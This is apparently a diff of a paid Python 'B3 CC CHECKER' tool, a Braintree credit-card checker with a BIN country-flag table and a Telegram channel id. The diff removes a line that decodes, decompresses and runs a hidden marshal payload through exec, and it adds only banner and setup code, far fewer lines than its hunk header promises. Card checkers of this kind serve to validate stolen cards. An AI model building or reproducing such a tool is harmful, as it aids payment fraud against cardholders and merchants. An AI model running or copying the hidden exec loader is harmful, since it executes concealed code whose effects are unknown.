@@ -1,2 +1,310 @@
+import requests,time,user_agent,re,base64,random,re,base64,os,sys
+from user_agent import *
+from colorama import Fore
+#---------[COLORS]--------#
+Z =  '\033[91m' 
+F = '\033[2;32m' 
+B = '\033[2;36m'
+X = '\033[1;33m' 
+C = '\033[2;35m'
+OKBLUE = '\033[94m'
+WARNING = '\033[93m'
+ENDC = '\033[0m'
+BOLD = '\033[1m'
+UNDERLINE = '\033[4m'
+LIME = '\033[38;5;10m'
+W=Fore.WHITE
+L=Fore.BLUE
+#-------[CLEAR]--------#
+def clear():
+    os.system('clear')
+#----------LOGO-------------#
+logo = ("""
+\033[38;2;173;216;230m ########  ########     ###     ######    #######  ##    ## 
+\033[38;2;255;160;122m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
+\033[38;2;144;238;144m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
+\033[38;2;255;69;0m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
+\033[38;2;30;144;255m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
+\033[38;2;238;130;238m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
+\033[38;2;255;215;0m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
+\x1b[1;95m┏───────────────────────────────────────────────┓
+\x1b[1;94m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;72;209;204mNIGHT STALKER
+\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;255;69;0mPAID🔥
+\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;147;112;219mNIGHT-STALKER-666
+\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;206;209mB3 CC CHECKER
+\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;255;105;180m2.1
+\x1b[1;91m \x1b[1;46m\033[1;91m ✅ NOT JUST A BRAINTREE CHECKER\033[;0m\033[1;91m\033[1;92m
+\x1b[1;95m┗───────────────────────────────────────────────┛
+""")
+def linex():
+        print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
+def clear():
+        os.system(f'clear')
+        print(logo)
+#--------[FLAGS]-----------#
+def clear_terminal():
+    os.system('cls' if os.name == 'nt' else 'clear')
+channel_id = "-1002317552901"
+country_flags = {
+    "Afghanistan": "🇦🇫", "Albania": "🇦🇱", "Algeria": "🇩🇿", "Andorra": "🇦🇩", "Angola": "🇦🇴", "Antigua and Barbuda": "🇦🇬", "Argentina": "🇦🇷", "Armenia": "🇦🇲", "Australia": "🇦🇺", "Austria": "🇦🇹", "Azerbaijan": "🇦🇿",
+    "Bahamas": "🇧🇸", "Bahrain": "🇧🇭", "Bangladesh": "🇧🇩", "Barbados": "🇧🇧", "Belarus": "🇧🇾", "Belgium": "🇧🇪", "Belize": "🇧🇿", "Benin": "🇧🇯", "Bhutan": "🇧🇹", "Bolivia": "🇧🇴", "Bosnia and Herzegovina": "🇧🇦", "Botswana": "🇧🇼",
+    "Brazil": "🇧🇷", "Brunei": "🇧🇳", "Bulgaria": "🇧🇬", "Burkina Faso": "🇧🇫", "Burundi": "🇧🇮", "Cabo Verde": "🇨🇻", "Cambodia": "🇰🇭", "Cameroon": "🇨🇲", "Canada": "🇨🇦", "Central African Republic": "🇨🇫", "Chad": "🇹🇩",
+    "Chile": "🇨🇱", "China": "🇨🇳", "Colombia": "🇨🇴", "Comoros": "🇰🇲", "Congo": "🇨🇬", "Congo (Democratic Republic)": "🇨🇩", "Costa Rica": "🇨🇷", "Croatia": "🇭🇷", "Cuba": "🇨🇺", "Cyprus": "🇨🇾", "Czech Republic": "🇨🇿",
+    "Denmark": "🇩🇰", "Djibouti": "🇩🇯", "Dominica": "🇩🇲", "Dominican Republic": "🇩🇴", "Ecuador": "🇪🇨", "Egypt": "🇪🇬", "El Salvador": "🇸🇻", "Equatorial Guinea": "🇲🇱", "Eritrea": "🇪🇷", "Estonia": "🇪🇪", "Eswatini": "🇸🇿",
+    "Ethiopia": "🇪🇹", "Fiji": "🇫🇯", "Finland": "🇫🇮", "France": "🇫🇷", "Gabon": "🇬🇦", "Gambia": "🇲🇲", "Georgia": "🇬🇪", "Germany": "🇩🇪", "Ghana": "🇬🇭", "Greece": "🇬🇷", "Grenada": "🇬🇩", "Guatemala": "🇵🇪",
+    "Guinea": "🇬🇳", "Guinea-Bissau": "🇬🇼", "Guyana": "🇬🇾", "Haiti": "🇭🇹", "Honduras": "🇭🇳", "Hungary": "🇭🇺", "Iceland": "🇮🇸", "India": "🇮🇳", "Indonesia": "🇮🇩", "Iran": "🇮🇷", "Iraq": "🇮🇶", "Ireland": "🇮🇪",
+    "Israel": "🇮🇱", "Italy": "🇮🇹", "Jamaica": "🇯🇲", "Japan": "🇯🇵", "Jordan": "🇯🇴", "Kazakhstan": "🇰🇿", "Kenya": "🇰🇪", "Kiribati": "🇰🇮", "Korea (North)": "🇰🇵", "Korea (South)": "🇰🇷", "Kuwait": "🇰🇼", "Kyrgyzstan": "🇰🇬",
+    "Laos": "🇱🇦", "Latvia": "🇱🇻", "Lebanon": "🇱🇧", "Lesotho": "🇱🇸", "Liberia": "🇱🇸", "Libya": "🇱🇾", "Liechtenstein": "🇱🇮", "Lithuania": "🇱🇹", "Luxembourg": "🇱🇺", "Madagascar": "🇲🇬", "Malawi": "🇲🇼", "Malaysia": "🇲🇾",
+    "Maldives": "🇲🇻", "Mali": "🇲🇱", "Malta": "🇲🇹", "Marshall Islands": "🇲🇭", "Mauritania": "🇲🇷", "Mauritius": "🇲🇺", "Mexico": "🇲🇽", "Micronesia": "🇫🇲", "Moldova": "🇲🇩", "Monaco": "🇲🇨", "Mongolia": "🇲🇳", "Montenegro": "🇲🇪",
+    "Morocco": "🇲🇦", "Mozambique": "🇲🇿", "Myanmar": "🇲🇲", "Namibia": "🇳🇦", "Nauru": "🇳🇷", "Nepal": "🇳🇵", "Netherlands": "🇳🇱", "New Zealand": "🇳🇿", "Nicaragua": "🇳🇮", "Niger": "🇳🇪", "Nigeria": "🇳🇬", "North Macedonia": "🇲🇰",
+    "Norway": "🇳🇴", "Oman": "🇴🇲", "Pakistan": "🇵🇰", "Palau": "🇵🇼", "Palestine": "🇵🇸", "Panama": "🇵🇦", "Papua New Guinea": "🇵🇬", "Paraguay": "🇵🇾", "Peru": "🇵🇪", "Philippines": "🇵🇭", "Poland": "🇵🇱", "Portugal": "🇵🇹",
+    "Qatar": "🇶🇦", "Romania": "🇷🇴", "Russia": "🇷🇺", "Rwanda": "🇷🇼", "Saint Kitts and Nevis": "🇰🇳", "Saint Lucia": "🇱🇨", "Saint Vincent and the Grenadines": "🇻🇨", "Samoa": "🇼🇸", "San Marino": "🇸🇲", "Sao Tome and Principe": "🇸🇹",
+    "Saudi Arabia": "🇸🇦", "Senegal": "🇸🇳", "Serbia": "🇷🇸", "Seychelles": "🇸🇨", "Sierra Leone": "🇸🇱", "Singapore": "🇸🇬", "Slovakia": "🇸🇰", "Slovenia": "🇸🇮", "Solomon Islands": "🇸🇧", "Somalia": "🇲🇲", "South Africa": "🇿🇦",
+    "South Sudan": "🇸🇸", "Spain": "🇪🇸", "Sri Lanka": "🇱🇰", "Sudan": "🇸🇩", "Suriname": "🇸🇷", "Sweden": "🇸🇪", "Switzerland": "🇨🇭", "Syria": "🇸🇾", "Taiwan": "🇹🇼", "Tajikistan": "🇹🇯", "Tanzania": "🇹🇿", "Thailand": "🇹🇭",
+    "Timor-Leste": "🇹🇱", "Togo": "🇹🇬", "Tonga": "🇹🇴", "Trinidad and Tobago": "🇹🇹", "Tunisia": "🇹🇳", "Turkey": "🇹🇷", "Turkmenistan": "🇹🇲", "Tuvalu": "🇹🇻", "Uganda": "🇺🇬", "Ukraine": "🇺🇦", "United Arab Emirates": "🇦🇪",
+    "United Kingdom": "🇬🇧", "United States of America": "🇺🇸", "Uruguay": "🇺🇾", "Uzbekistan": "🇺🇿", "Vanuatu": "🇻🇺", "Vatican City": "🇻🇦", "Venezuela": "🇻🇪", "Vietnam": "🇻🇳", "Yemen": "🇾🇪", "Zambia": "🇿🇲", "Zimbabwe": "🇿🇼"
+}
+#--------[BIN-CHECK]-------#
+def get_country_flag(country_name):
+    return country_flags.get(country_name, '')
 
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b"=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